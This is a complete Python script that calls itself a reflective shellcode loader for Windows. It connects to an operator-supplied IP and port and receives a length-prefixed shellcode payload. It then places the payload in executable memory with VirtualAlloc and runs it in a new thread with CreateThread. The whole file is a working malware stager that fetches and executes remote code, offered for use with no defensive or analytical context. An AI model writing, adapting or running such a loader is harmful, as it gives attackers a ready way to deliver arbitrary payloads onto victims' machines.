import socket
import ctypes
import argparse
import struct

def recv_shellcode(ip, port):
    s = socket.create_connection((ip, port))
    size_data = s.recv(4)
    shellcode_size = struct.unpack('<I', size_data)[0]

    shellcode = b''
    while len(shellcode) < shellcode_size:
        chunk = s.recv(4096)
        if not chunk:
            break
        shellcode += chunk
    s.close()
    return shellcode

def execute_shellcode(shellcode):
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    space = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    buff = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, len(shellcode))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_void_p(space), 0, 0, ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

def main():
    parser = argparse.ArgumentParser(description="Reflective shellcode loader")
    parser.add_argument("-i", "--ip", required=True)
    parser.add_argument("-p", "--port", type=int, required=True)
    args = parser.parse_args()

    shellcode = recv_shellcode(args.ip, args.port)
    print(f"[+] Received shellcode ({len(shellcode)} bytes)")
    execute_shellcode(shellcode)

if __name__ == "__main__":
    main()
